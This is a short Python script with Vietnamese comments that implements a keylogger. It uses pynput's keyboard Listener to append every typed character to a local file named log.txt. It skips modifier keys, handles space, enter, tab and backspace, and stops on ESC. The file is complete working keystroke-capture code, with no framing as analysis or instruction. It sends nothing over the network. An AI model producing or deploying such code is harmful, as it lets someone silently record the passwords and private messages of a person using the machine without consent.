from pynput.keyboard import Listener
import os

def write_to_file(key):
    letter = str(key).replace("'", "")

    # Bỏ qua phím 
    if letter in ['Key.shift', 'Key.shift_l', 'Key.shift_r',
                  'Key.ctrl_l', 'Key.ctrl_r',
                  'Key.alt_l', 'Key.alt_r',
                  'Key.cmd', 'Key.cmd_r']:
        return

    # Các phím đặc biệt
    if letter == 'Key.space':
        letter = ' '
    elif letter == "Key.enter":
        letter = "\n"   
    elif letter == "Key.tab":
        letter = "[TAB]"
    elif letter in ['Key.backspace', 'Key.delete']:
        # Xóa ký tự 
        if os.path.exists("log.txt"):
            with open("log.txt", "r", encoding="utf-8") as f:
                content = f.read()
            if content:
                content = content[:-1]  # bỏ ký tự cuối
                with open("log.txt", "w", encoding="utf-8") as f:
                    f.write(content)
        return
    elif letter == "Key.esc":
        # Dừng chương trình khi nhấn ESC
        return False

    # Ghi ký tự hợp lệ
    if len(letter) == 1 or letter in ["\n", "[TAB]"]:
        with open("log.txt", 'a', encoding="utf-8") as f:
            f.write(letter)

# Lắng nghe phím bấm
with Listener(on_press=write_to_file) as listener:
    listener.join()
